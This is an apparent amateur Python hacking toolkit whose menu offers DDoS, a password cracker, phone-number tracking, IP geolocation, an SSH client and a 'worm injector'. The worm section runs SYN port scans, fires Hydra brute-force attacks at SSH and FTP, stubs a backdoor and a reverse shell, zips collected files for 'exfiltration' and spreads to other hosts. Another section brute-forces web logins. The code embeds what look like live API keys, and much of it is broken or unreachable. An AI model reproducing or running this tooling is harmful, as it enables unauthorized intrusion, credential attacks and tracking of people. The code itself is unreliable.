# REQUIREMENTS : pip install colorama requests socket threading time random logging os cryptography phonenumbers opencage.geocoder geopy

from colorama import Fore, Back, Style
import os
import requests
from itertools import product
import sys
from multiprocessing import Pool, cpu_count, Manager
import time
from threading import Thread

    # BEFORE YOU RUN THE SCRIPT, INSTALL THESE REQUIREMENTS: pip install colorama requests socket threading time random logging os cryptography phonenumbers opencage.geocoder geopy
    # SCRIPT IS STILL IN DEMO SO IT MIGHT NOT WORK PERFECTLY ! 

def banner():
    print(f"""
                                                
                    {Fore.CYAN}███╗░░░███╗░█████╗░██████╗░███████╗░██████╗  ████████╗░█████╗░░█████╗░██╗░░░░░██╗░░██╗██╗████████╗
                    {Fore.CYAN}████╗░████║██╔══██╗██╔══██╗██╔════╝██╔════╝  ╚══██╔══╝██╔══██╗██╔══██╗██║░░░░░██║░██╔╝██║╚══██╔══╝
                    {Fore.CYAN}██╔████╔██║███████║██║░░██║█████╗░░╚█████╗░  ░░░██║░░░██║░░██║██║░░██║██║░░░░░█████═╝░██║░░░██║░░░
                    {Fore.CYAN}██║╚██╔╝██║██╔══██║██║░░██║██╔══╝░░░╚═══██╗  ░░░██║░░░██║░░██║██║░░██║██║░░░░░██╔═██╗░██║░░░██║░░░
                    {Fore.CYAN}██║░╚═╝░██║██║░░██║██████╔╝███████╗██████╔╝  ░░░██║░░░╚█████╔╝╚█████╔╝███████╗██║░╚██╗██║░░░██║░░░
                    {Fore.CYAN}╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═════╝░╚══════╝╚═════╝░  ░░░╚═╝░░░░╚════╝░░╚════╝░╚══════╝╚═╝░░╚═╝╚═╝░░░╚═╝░░░

                
                                                    {Fore.LIGHTGREEN_EX}MADE BY xav666vax ON DISCORD


                         {Fore.RED}_____________________________________________________________________________________
                        {Fore.RED}|                                          {Fore.RED}|                                          |      
                        {Fore.RED}|       {Fore.RED}[Powerful DDoS Attack] {Fore.GREEN}[1] {Fore.CYAN}MHDDoS  {Fore.RED}|  {Fore.GREEN}[4] {Fore.CYAN}PNT  {Fore.RED}[Very Good Number Locater]     {Fore.RED}|           
                        {Fore.RED}|       {Fore.RED}[Full IP Information]  {Fore.GREEN}[2] {Fore.CYAN}GeoIP   {Fore.RED}|  {Fore.GREEN}[5] {Fore.CYAN}SSSH {Fore.RED}[Super Secure Shell]           {Fore.RED}|      
                        {Fore.RED}|       {Fore.RED}[Password Cracker]     {Fore.GREEN}[3] {Fore.CYAN}PCrack  {Fore.RED}|  {Fore.GREEN}[6] {Fore.CYAN}WORM {Fore.RED}[Powerful Worm Injector]       {Fore.RED}|      
                        {Fore.RED}|__________________________________________{Fore.RED}|__________________________________________|
                                                            {Fore.LIGHTGREEN_EX}   {Fore.LIGHTGREEN_EX}[7] {Fore.RED}EXIT  {Fore.LIGHTGREEN_EX}
                                                            
                                                            
                                                            """)
                                                    
                                    
                                            

def WORM():
    import socket
    import asyncio
    import random
    import os
    import subprocess
    import shutil
    import zipfile
    import logging
    import sys
    from cryptography.fernet import Fernet
    from scapy.all import IP, TCP, srp1, RandShort
    from colorama import Fore, Back, Style
    
    def banner():
        print(f"""
                            
                 {Fore.CYAN}░██╗░░░░░░░██╗░█████╗░██████╗░███╗░░░███╗  ██╗░░░██╗██╗██████╗░██╗░░░██╗░██████╗
                 {Fore.CYAN}░██║░░██╗░░██║██╔══██╗██╔══██╗████╗░████║  ██║░░░██║██║██╔══██╗██║░░░██║██╔════╝
                 {Fore.CYAN}░╚██╗████╗██╔╝██║░░██║██████╔╝██╔████╔██║  ╚██╗░██╔╝██║██████╔╝██║░░░██║╚█████╗░
                 {Fore.CYAN}░░████╔═████║░██║░░██║██╔══██╗██║╚██╔╝██║  ░╚████╔╝░██║██╔══██╗██║░░░██║░╚═══██╗
                 {Fore.CYAN}░░╚██╔╝░╚██╔╝░╚█████╔╝██║░░██║██║░╚═╝░██║  ░░╚██╔╝░░██║██║░░██║╚██████╔╝██████╔╝
                 {Fore.CYAN}░░░╚═╝░░░╚═╝░░░╚════╝░╚═╝░░╚═╝╚═╝░░░░░╚═╝  ░░░╚═╝░░░╚═╝╚═╝░░╚═╝░╚═════╝░╚═════╝░
                                                       
                                                    {Fore.RED}MADE BY xav666vax ON DISCORD
                 
                 """)

    # Configure logging
    logging.basicConfig(level=logging.INFO,
                        format='%(asctime)s - %(levelname)s - %(message)s')

    # List of target IP addresses
    targets = []

    # List of ports to scan (all ports from 1 to 65535)
    ports = list(range(1, 65536))

    # Encryption key for secure communication
    key = Fernet.generate_key()
    cipher_suite = Fernet(key)

    # Semaphore to limit the number of concurrent tasks
    semaphore = asyncio.Semaphore(10000)  # Increase concurrency

    # Function to scan a single port asynchronously
    async def scan_port(ip, port, open_ports, progress):
        async with semaphore:
            try:
                # Use SYN scan for stealth
                packet = IP(dst=ip) / TCP(sport=RandShort(), dport=port, flags="S")
                response = srp1(packet, timeout=0.01, verbose=0)  # Reduce timeout
                if response and response.haslayer(TCP) and response.getlayer(
                        TCP).flags == 0x12:  # SYN-ACK
                    open_ports.append(port)
                # No logging during scan to reduce overhead
            except Exception:
                pass
            finally:
                progress[0] += 1
                sys.stdout.write(f"\rScanning {ip}: {progress[0]}/{len(ports)} ports")
                sys.stdout.flush()

    # Scan for open ports using asyncio
    async def scan(ip):
        open_ports = []
        progress = [0]
        tasks = [scan_port(ip, port, open_ports, progress) for port in ports]
        await asyncio.gather(*tasks)
        sys.stdout.write("\n")  # Move to the next line after scanning
        return open_ports

    # Collect system information
    def collect_info(ip):
        info = {'ip': ip, 'files': [], 'passwords': []}

        try:
            # Collect files (simulated)
            # Replace with your actual file collection logic
            files = os.listdir('C:\\')
            info['files'] = files
        except Exception as e:
            logging.error(f"[!] Error collecting files: {e}")

        try:
            # Collect passwords (simulated)
            # This is just a placeholder, actual password collection is not recommended.
            with open('C:\\passwords.txt', 'r') as file:
                info['passwords'] = [line.strip() for line in file]
        except Exception as e:
            logging.error(f"[!] Error collecting passwords: {e}")

        return info

    # Exploit framework
    class ExploitFramework:

        def __init__(self, ip, port):
            self.ip = ip
            self.port = port

        def exploit_ssh(self):
            logging.info(f"[+] Attempting SSH exploit on {self.ip}:{self.port}")
            # Simulate SSH exploit using Hydra
            # You will need to install Hydra separately
            # Replace with your actual Hydra command
            command = f'hydra -l root -P /path/to/password_list {self.ip} ssh'
            subprocess.run(command, shell=True)
            return True

        def exploit_ftp(self):
            logging.info(f"[+] Attempting FTP exploit on {self.ip}:{self.port}")
            # Simulate FTP exploit using Hydra
            # You will need to install Hydra separately
            # Replace with your actual Hydra command
            command = f'hydra -l anonymous -P /path/to/password_list {self.ip} ftp'
            subprocess.run(command, shell=True)
            return True

        def exploit_http(self):
            logging.info(f"[+] Attempting HTTP exploit on {self.ip}:{self.port}")
            # Simulate HTTP exploit
            # You can use tools like Burp Suite or OWASP ZAP for testing
            # Replace with your actual testing command
            command = f'python /path/to/your/http_scanner.py {self.ip}'
            subprocess.run(command, shell=True)
            return True

        def exploit(self):
            if self.port == 22:
                return self.exploit_ssh()
            elif self.port == 21:
                return self.exploit_ftp()
            elif self.port == 80 or self.port == 443:
                return self.exploit_http()
            else:
                logging.warning(f"[-] No exploit available for port {self.port}")
                return False

    # Backdoor code
    def backdoor(ip, port):
        logging.info(f"[+] Establishing backdoor on {ip}:{port}")
        # Simulate backdoor setup
        # You would typically use a specific backdoor tool or technique here
        pass

    # Reverse shell (simulated)
    def reverse_shell(ip, port):
        logging.info(f"[+] Establishing reverse shell on {ip}:{port}")
        # You will need to implement a reverse shell functionality here
        # This is just a placeholder
        print(f"Reverse shell established to {ip}:{port}")
        while True:
            command = input(f"{ip}:{port} $ ")
            if command.lower() == 'exit':
                break
            print(f"Command: {command}")
            # Replace with your actual reverse shell command

    # Save collected information
    def save_info(info):
        with open('C:\\collected_info.txt', 'a') as file:
            file.write(f"IP: {info['ip']}\n")
            file.write(f"Files: {', '.join(info['files'])}\n")
            file.write(f"Passwords: {', '.join(info['passwords'])}\n\n")

    # Exfiltrate files
    def exfiltrate_files(info, ip):
        with zipfile.ZipFile('C:\\exfiltrated_files.zip', 'w') as zipf:
            for file in info['files']:
                try:
                    with open(f'C:\\{file}', 'rb') as f:
                        zipf.writestr(file, f.read())
                except Exception as e:
                    logging.error(f"[!] Error exfiltrating file {file}: {e}")
        logging.info(f"[+] Exfiltrated files from {ip}")

    # Spread to other machines
    def spread(ip):
        for target_ip in targets:
            if target_ip != socket.gethostbyname(
                    socket.gethostname()) and target_ip != ip:
                logging.info(f"[+] Spreading to {target_ip}")
                asyncio.run(scan(target_ip))

    # Password cracking (simulated)
    def crack_passwords(passwords):
        logging.info("[+] Cracking passwords...")
        cracked_passwords = []
        for password in passwords:
            # Simulate password cracking
            # You would typically use a password cracking tool here
            if password == 'root':
                cracked_passwords.append(password)
        return cracked_passwords

    # Encrypt collected information
    def encrypt_info(info):
        encrypted_info = {}
        for key, value in info.items():
            if isinstance(value, list):
                encrypted_info[key] = [
                    cipher_suite.encrypt(item.encode()) for item in value
                ]
            else:
                encrypted_info[key] = cipher_suite.encrypt(value.encode())
        return encrypted_info

    # Decrypt collected information
    def decrypt_info(encrypted_info):
        decrypted_info = {}
        for key, value in encrypted_info.items():
            if isinstance(value, list):
                decrypted_info[key] = [
                    cipher_suite.decrypt(item).decode() for item in value
                ]
            else:
                decrypted_info[key] = cipher_suite.decrypt(value).decode()
        return decrypted_info

    # Main function
    async def main():
        while True:
            banner()
            target_ip = input("Enter the target IP: ")
            targets.append(target_ip)
            logging.info("[+] Starting worm virus")
            for ip in targets:
                open_ports = await scan(ip)
                if not open_ports:
                    logging.warning(f"[-] No open ports found on {ip}")
                    continue

                logging.info(f"[+] Open ports on {ip}: {open_ports}")
                for port in open_ports:
                    exploit_framework = ExploitFramework(ip, port)
                    if exploit_framework.exploit():
                        logging.info(f"[+] Successfully exploited {ip}:{port}")
                        backdoor(ip, port)
                        info = collect_info(ip)
                        save_info(info)
                        exfiltrate_files(info, ip)
                        reverse_shell(ip, port)
                        spread(ip)
                        break  # Stop scanning after successfully exploiting a port
                    else:
                        logging.warning(f"[-] Failed to exploit {ip}:{port}")

    if __name__ == "__main__":
        asyncio.run(main())

        print("\n[!] Brute force attack completed. Password not found.")

        # Main function for port scanning and exploitation
        main()
        while True:
            time.sleep(1) # Keep the script running

        while True:
            endchoice = input("// Done Executing, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
            if endchoice == 'r':
                os.system('cls' if os.name == 'nt' else 'clear')
                PNT()
            elif endchoice == 'm':
                os.system('cls' if os.name == 'nt' else 'clear')
                main()
            else:
                print("Invalid option. Please try again.")

def PNT():
    import phonenumbers
    from phonenumbers import geocoder, carrier, timezone
    from opencage.geocoder import OpenCageGeocode
    from geopy.geocoders import Nominatim
    from phonenumbers.phonenumberutil import number_type, PhoneNumberType
    from colorama import Fore, Back, Style
    import requests
    import os

    def banner():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(Fore.BLUE + """

                        ███▄ ▄███▓ ▄▄▄      ▓█████▄ ▓█████   ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
                        ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
                        ▓██    ▓██░▒██  ▀█▄  ░██   █▌▒███   ░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
                        ▒██    ▒██ ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄   ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
                        ▒██▒   ░██▒ ▓█   ▓██▒░▒████▓ ░▒████▒▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
                        ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
                        ░  ░      ░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
                        ░      ░     ░   ▒    ░ ░  ░    ░   ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
                            ░         ░  ░   ░       ░  ░      ░                  ░ ░      ░ ░      ░  ░      ░  


                                                      MADE BY xav666vax ON DISCORD
                                                   
                                                         Phone Number Tracker""")

    def get_phone_number_details(phone_number):
        try:
            parsed_number = phonenumbers.parse(phone_number)
            geolocation = geocoder.description_for_number(parsed_number, "en")
            carrier_name = carrier.name_for_number(parsed_number, "en")
            time_zone = timezone.time_zones_for_number(parsed_number)
            region_code = phonenumbers.region_code_for_number(parsed_number)
            nsn = phonenumbers.national_significant_number(parsed_number)
            phone_type = number_type(parsed_number)

            if phone_type == PhoneNumberType.MOBILE:
                phone_type_desc = "Mobile"
            elif phone_type == PhoneNumberType.FIXED_LINE:
                phone_type_desc = "Fixed-line"
            else:
                phone_type_desc = "Unknown"

            return parsed_number, geolocation, carrier_name, time_zone, phone_type_desc, region_code, nsn

        except phonenumbers.NumberParseException as e:
            print(f"Error parsing phone number: {e}")
            return None, None, None, None, None, None, None

    def get_address_from_lat_lng(api_key, lat, lng):
        try:
            geocoder = OpenCageGeocode(api_key)
            results = geocoder.reverse_geocode(lat, lng)
            if results and len(results):
                detailed_location = results[0]
                return detailed_location
            else:
                return None

        except Exception as e:
            print(f"Error fetching address from latitude and longitude: {e}")
            return None

    def track_phone_number(api_key):
        banner()
        phone_number = input("Enter the phone number with the country code (e.g., +1234567890): ")
        parsed_number, geolocation, carrier_name, time_zone, phone_type_desc, region_code, nsn = get_phone_number_details(phone_number)

        if parsed_number:
            location = geocoder.description_for_number(parsed_number, "en")
            geolocator = Nominatim(user_agent="phone_number_tracker")
            loc = geolocator.geocode(location)
            if loc:
                lat, lng = loc.latitude, loc.longitude
            else:
                lat, lng = 0, 0
                print("Latitude and Longitude not found for the provided geolocation.")

            detailed_location = get_address_from_lat_lng(api_key, lat, lng)

            print(Fore.YELLOW + "\n" + "=" * 50)
            print(Fore.YELLOW + f"{'Phone Number Details':^50}")
            print(Fore.YELLOW + "=" * 50)
            print(Fore.WHITE + f"{'Phone Number:':<20} {phonenumbers.format_number(parsed_number, phonenumbers.PhoneNumberFormat.INTERNATIONAL)}")
            print(Fore.WHITE + f"{'Valid Number:':<20} {phonenumbers.is_valid_number(parsed_number)}")
            print(Fore.WHITE + f"{'Region:':<20} {geolocation}")
            print(Fore.WHITE + f"{'Carrier:':<20} {carrier_name}")
            print(Fore.WHITE + f"{'Time Zone:':<20} {', '.join(time_zone)}")
            print(Fore.WHITE + f"{'Phone Type:':<20} {phone_type_desc}")
            print(Fore.WHITE + f"{'Region Code:':<20} {region_code}")
            print(Fore.WHITE + f"{'National Number:':<20} {nsn}")
            if detailed_location:
                print(Fore.WHITE + f"{'Address:':<20} {detailed_location['formatted']}")
                print(Fore.WHITE + f"{'Country:':<20} {detailed_location['components'].get('country', 'N/A')}")
                print(Fore.WHITE + f"{'City:':<20} {detailed_location['components'].get('city', detailed_location['components'].get('town', detailed_location['components'].get('village', 'N/A')))}")
                print(Fore.WHITE + f"{'Town:':<20} {detailed_location['components'].get('town', detailed_location['components'].get('village', 'N/A'))}")
                print(Fore.WHITE + f"{'Street:':<20} {detailed_location['components'].get('road', 'N/A')}")
                print(Fore.WHITE + f"{'Latitude:':<20} {detailed_location['geometry']['lat']}")
                print(Fore.WHITE + f"{'Longitude:':<20} {detailed_location['geometry']['lng']}")
            else:
                print(Fore.RED + "Address details not found.")

            # Get more precise location using Google Maps Geocoding API
            google_maps_api_key = "AIzaSyDUqFG9lSu4sBBuC2-C-PTogSNuZ_LNDdU"  # Replace with your actual API key
            google_maps_url = f"https://maps.googleapis.com/maps/api/geocode/json?address={location}&key={google_maps_api_key}"
            response = requests.get(google_maps_url)
            if response.status_code == 200:
                data = response.json()
                if data['status'] == 'OK':
                    google_address = data['results'][0]['formatted_address']
                    print(Fore.WHITE + f"{'Google Maps Address:':<20} {google_address}")
                else:
                    print(Fore.RED + f"Error from Google Maps Geocoding API: {data['status']}")
            else:
                print(Fore.RED + "Error connecting to Google Maps Geocoding API.")

            print(Fore.YELLOW + "=" * 50 + "\n")
        else:
            print(Fore.RED + "Invalid phone number format. Please enter a valid phone number with country code.")

    api_key = "588cee3f6bb849e5b820389669e6c3b9"
    track_phone_number(api_key)
    
    while True:
        endchoice = input("// Connection Closed, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            PNT()
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
        else:
            print("Invalid option. Please try again.")


def SSH():
    import paramiko
    import getpass
    from colorama import Fore, init
    import time
    import threading

    # Initialize colorama
    init(autoreset=True)

    def banner():
        print(Fore.CYAN + """
        ███████╗███████╗██╗  ██╗     ██████╗██╗     ██╗███████╗███╗   ██╗████████╗
        ██╔════╝██╔════╝██║ ██╔╝    ██╔════╝██║     ██║██╔════╝████╗  ██║╚══██╔══╝
        ███████╗█████╗  █████╔╝     ██║     ██║     ██║█████╗  ██╔██╗ ██║   ██║   
        ╚════██║██╔══╝  ██╔═██╗     ██║     ██║     ██║██╔══╝  ██║╚██╗██║   ██║   
        ███████║███████╗██║  ██╗    ╚██████╗███████╗██║███████╗██║ ╚████║   ██║   
        ╚══════╝╚══════╝╚═╝  ╚═╝     ╚═════╝╚══════╝╚═╝╚══════╝╚═╝  ╚═══╝   ╚═╝   
                                                                                  
                                  Secure Shell Client
        """)

    def ssh_connect(host, port, username, password=None, key_path=None):
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            if key_path:
                key = paramiko.RSAKey.from_private_key_file(key_path)
                client.connect(hostname=host, port=port, username=username, pkey=key)
            else:
                client.connect(hostname=host, port=port, username=username, password=password)

            print(Fore.GREEN + "Connected to the SSH server successfully!")
            return client

        except paramiko.AuthenticationException:
            print(Fore.RED + "Authentication failed, please verify your credentials")
            return None
        except paramiko.SSHException as sshException:
            print(Fore.RED + f"Unable to establish SSH connection: {sshException}")
            return None
        except Exception as e:
            print(Fore.RED + f"Exception in connecting: {e}")
            return None

    def execute_command(client, command):
        try:
            stdin, stdout, stderr = client.exec_command(command)
            output = stdout.read().decode('utf-8')
            error = stderr.read().decode('utf-8')

            if output:
                print(Fore.YELLOW + "Output:\n" + Fore.WHITE + output)
            if error:
                print(Fore.RED + "Error:\n" + Fore.WHITE + error)

            return command

        except Exception as e:
            print(Fore.RED + f"Exception in executing command: {e}")
            return None

    def schedule_command(client, command, delay):
        def delayed_execution():
            time.sleep(delay)
            execute_command(client, command)

        threading.Thread(target=delayed_execution).start()
        print(Fore.GREEN + f"Command scheduled to run in {delay} seconds")

    def transfer_file(client, local_path, remote_path, direction='upload'):
        try:
            sftp = client.open_sftp()
            if direction == 'upload':
                sftp.put(local_path, remote_path)
                print(Fore.GREEN + f"File uploaded: {local_path} -> {remote_path}")
            else:
                sftp.get(remote_path, local_path)
                print(Fore.GREEN + f"File downloaded: {remote_path} -> {local_path}")
            sftp.close()
        except Exception as e:
            print(Fore.RED + f"Exception in file transfer: {e}")

    def system_monitor(client):
        try:
            command = "vmstat 1 5; iostat 1 5; mpstat 1 5; free -m"
            execute_command(client, command)
        except Exception as e:
            print(Fore.RED + f"Exception in system monitoring: {e}")

    def command_menu():
        commands = [
            "uname -a", "uptime", "df -h", "free -m", "top -n 1 -b", "ps aux",
            "netstat -tulnp", "ss -tuln", "ip a", "ip route", "hostnamectl", "ls -l",
            "cat /etc/os-release", "df -i", "du -sh /*", "dmesg", "last", "who",
            "w", "ifconfig", "ping -c 4 google.com"
        ]

        print(Fore.CYAN + "=" * 50)
        print(Fore.CYAN + f"{'Command Menu':^50}")
        print(Fore.CYAN + "=" * 50)
        for i, cmd in enumerate(commands, 1):
            print(Fore.GREEN + f"{i}. {cmd}")
        print(Fore.CYAN + "=" * 50)

        return commands

    def main():
        try:
            banner()
            host = input(Fore.BLUE + "Enter hostname or IP address: ")
            port = int(input(Fore.BLUE + "Enter port number (default is 22): ") or 22)
            username = input(Fore.BLUE + "Enter your username: ")
            auth_method = input(Fore.BLUE + "Authenticate using password or private key? (type 'password' or 'key'): ")

            if auth_method == 'key':
                key_path = input(Fore.BLUE + "Enter the path to your private key file: ")
                password = None
            else:
                key_path = None
                password = getpass.getpass(Fore.BLUE + "Enter your password: ")

            client = ssh_connect(host, port, username, password, key_path)

            if client:
                commands = command_menu()
                command_history = []

                while True:
                    choice = input(Fore.BLUE + "\nChoose an option:\n1. Execute command\n2. Schedule command\n3. Transfer file\n4. System Monitor\n5. Exit\nEnter your choice: ")

                    if choice == '1':
                        command_choice = input(Fore.BLUE + "Enter the command number to execute or type your custom command: ")
                        if command_choice.isdigit():
                            command_choice = int(command_choice)
                            if 1 <= command_choice <= len(commands):
                                command = commands[command_choice - 1]
                                print(Fore.GREEN + f"Executing command: {command}")
                            else:
                                print(Fore.RED + "Invalid command number. Please try again.")
                                continue
                        else:
                            command = command_choice

                        executed_command = execute_command(client, command)
                        if executed_command:
                            command_history.append(executed_command)
                    elif choice == '2':
                        command = input(Fore.BLUE + "Enter the command to schedule: ")
                        delay = int(input(Fore.BLUE + "Enter the delay in seconds: "))
                        schedule_command(client, command, delay)
                    elif choice == '3':
                        direction = input(Fore.BLUE + "Type 'upload' to upload or 'download' to download: ")
                        local_path = input(Fore.BLUE + "Enter the local file path: ")
                        remote_path = input(Fore.BLUE + "Enter the remote file path: ")
                        transfer_file(client, local_path, remote_path, direction)
                    elif choice == '4':
                        system_monitor(client)
                    elif choice == '5':
                        print(Fore.GREEN + "Exiting...")
                        break
                    else:
                        print(Fore.RED + "Invalid choice. Please try again.")

                print(Fore.CYAN + "\nCommand History:")
                for cmd in command_history:
                    print(Fore.WHITE + cmd)

                client.close()
        except Exception as e:
            print(Fore.RED + f"Exception: {e}")

    if __name__ == "__main__":
        main()

    while True:
        endchoice = input("// Connection Closed, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            SSH()
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
        else:
            print("Invalid option. Please try again.")

    
    
    input() 


def PCrack():
    # Import statements moved to the top level
    import requests
    from colorama import Fore, Back, Style
    from itertools import product
    import sys
    from multiprocessing import Pool, cpu_count, Manager
    import time
    from threading import Thread
    
    def banner():
        print(Fore.RED + """
   
                    ███▄ ▄███▓ ▄▄▄      ▓█████▄ ▓█████   ██████    ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
                    ▓██▒▀█▀ ██▒▒████▄    ▒██▀ ██▌▓█   ▀ ▒██    ▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
                    ▓██    ▓██░▒██  ▀█▄  ░██   █▌▒███   ░ ▓██▄      ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
                    ▒██    ▒██ ░██▄▄▄▄██ ░▓█▄   ▌▒▓█  ▄   ▒   ██▒   ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
                    ▒██▒   ░██▒ ▓█   ▓██▒░▒████▓ ░▒████▒▒██████▒▒     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
                    ░ ▒░   ░  ░ ▒▒   ▓▒█░ ▒▒▓  ▒ ░░ ▒░ ░▒ ▒▓▒ ▒ ░     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
                    ░  ░      ░  ▒   ▒▒ ░ ░ ▒  ▒  ░ ░  ░░ ░▒  ░ ░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
                    ░      ░     ░   ▒    ░ ░  ░    ░   ░  ░  ░       ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
                        ░         ░  ░   ░       ░  ░      ░                  ░ ░      ░ ░      ░  ░      ░  


                                                  MADE BY xav666vax ON DISCORD
                                               
                                                      Password Cracker""")

    def brute_force(args):
        target_ip, username, password, output_queue = args
        url = f"http://{target_ip}/login"  # Adjust the URL based on the target service
        data = {'username': username, 'password': password}
        try:
            response = requests.post(url, data=data, timeout=1)  # Increased timeout to 1 second
            if "Login successful" in response.text:  # Adjust this condition based on the target's response
                output_queue.put(f"\n[+] Password found: {password}")
                return password
            else:
                return None
        except requests.exceptions.RequestException as e:
            output_queue.put(f"\n[!] Error: {e}")
            return None

    def generate_passwords(characters, max_length, chunk_size=1000):
        for length in range(1, max_length + 1):
            print(f"\n[*] Trying passwords of length {length}...")
            for i in range(0, len(characters)**length, chunk_size):
                chunk = [''.join(p) for p in product(characters, repeat=length)]
                yield chunk[i:i + chunk_size]

    def output_handler(output_queue):
        """Handles printing output from the queue."""
        while True:
            if not output_queue.empty():
                message = output_queue.get()
                if message.startswith("\r"):
                    # Overwrite the current line
                    sys.stdout.write(message)
                    sys.stdout.flush()
                else:
                    # Print a new line
                    print(message)
            else:
                time.sleep(0.1)  # Avoid busy-waiting

    def main():
        # Input parameters
        target_ip = input("Enter the target IP: ")
        username = input("Enter the username: ")
        characters = input(
            "Enter the character set (e.g., abc123): "
        ) or "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@#$%^&*()"
        max_length = int(input("Enter the maximum password length (e.g., 16): ") or 16)

        print(
            f"[*] Starting brute force attack on {target_ip} with username: {username}"
        )

        total_combinations = sum(
            len(characters)**length for length in range(1, max_length + 1))
        print(f"[*] Total combinations to try: {total_combinations}")

        # Use all available CPU cores
        num_workers = cpu_count()
        print(f"[*] Using {num_workers} CPU cores for parallel processing.")

        # Create a shared queue for output
        manager = Manager()
        output_queue = manager.Queue()

        # Start the output handler in a separate thread
        output_thread = Thread(target=output_handler, args=(output_queue, ))
        output_thread.daemon = True  # Daemonize thread to exit when the main program exits
        output_thread.start()

        # Generate passwords and distribute work
        password_generator = generate_passwords(characters, max_length)
        with Pool(num_workers) as pool:
            for chunk in password_generator:
                args = [(target_ip, username, password, output_queue) for password in chunk]
                results = pool.map(brute_force, args)
                for i, result in enumerate(results):
                    if result:
                        print(f"\n[+] Password found: {result}")
                        return  # Exit if password is found
                    else:
                        # Send the current password to the output queue
                        output_queue.put(f"\r[-] Trying: {chunk[i].ljust(20)} (Length: {len(chunk[i])})")
                        sys.stdout.flush()

        print("\n[!] Brute force attack completed. Password not found.")

    
    while True:
        endchoice = input("// Password Cracked, Choose 'r' to rerun script, or choose 'm' to go back to main. : ")
        if endchoice == 'r':
            os.system('cls' if os.name == 'nt' else 'clear')
            PCrack()
        elif endchoice == 'm':
            os.system('cls' if os.name == 'nt' else 'clear')
            main()
        else:
            print("Invalid option. Please try again.")

    
    input()

def GeoIP():
    
    #!/usr/bin/python
    # -*- coding: utf-8 -*-

    # Code of: https://github.com/Euronymou5/Spyrod-v2
    # License:  MPL-2.0 license

    import requests, json
    import os
    import time
    from platform import system
    from opencage.geocoder import OpenCageGeocode

    class colores:
        red="\033[31;1m"


    os.system("clear")
    logo = colores.red + '''
                     uu$:$:$:$:$:$uu
                  uu$$$$$$$$$$$$$$$$$uu
                 u$$$$$$$$$$$$$$$$$$$$$u
                 u$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$$$$$$$$$$$$$$$$$$$$u
               u$$$$$$*   *$$$*   *$$$$$$u
               *$$$$*      u$u       $$$$*
                $$$u       u$u       u$$$
                $$$u      u$$$u      u$$$
                 *$$$$uu$$$   $$$uu$$$$*
                  *$$$$$$$*   *$$$$$$$*
                    u$$$$$$$u$$$$$$$u
                     u$*$*$*$*$*$*$u
          uuu        $$u$ $ $ $ $u$$       uuu
         u$$$$        $$u$u$u$u$u$$       u$$$$
          $$$$$uu      *$$$$$$$$$*     uu$$$$$$
        u$$$$$$$$$$$      *****    uuuu$$$$$$$$$
        $$$$***$$$$$$$$$$uuu   uu$$$$$$$$$***$$$*
         ***      **$$$$$$$$$$$uu **$***
                  uuuu **$$$$$$$$$$uuu
         u$$$uuu$$$$$$$$$uu **$$$$$$$$$$$uuu$$$
         $$$$$$$$$$****           **$$$$$$$$$$$*
           *$$$$$*                      **$$$$**
             $$$*    ___________________  $$$$*
                    |Made by: xav666vax |
                    |___________________|
                    | Spyrod Version: v3|
                    |___________________|
             
             '''  

    try:
      print(logo)
      print('[~] Enter the IP: ')
      ip = input('[~] IP: ')
      print(f'[~] Looking up data for: {ip}')
      time.sleep(2)
      api = f"http://ip-api.com/json/{ip}?fields=status,message,continent,continentCode,country,countryCode,region,regionName,city,district,zip,lat,lon,timezone,offset,currency,isp,org,as,asname,reverse,mobile,proxy,hosting,query&lang=es"

      data = requests.get(api).json()
      ##-----------Query---------##
      print("\n[~] [IP]:", data['query'])
      ##--------------ISP---------##
      print("[~] [ISP]:", data['isp'])
      if data['isp'] == False:
        print('[~] [ISP not found!]')
      ##------------Org-----------##
      print("[~] [Organization]:", data['org'])
      if data['org'] == False:
        print('[~] [Organization not found!]')
      ##-----------City---------##
      print("[~] [City]:", data['city'])
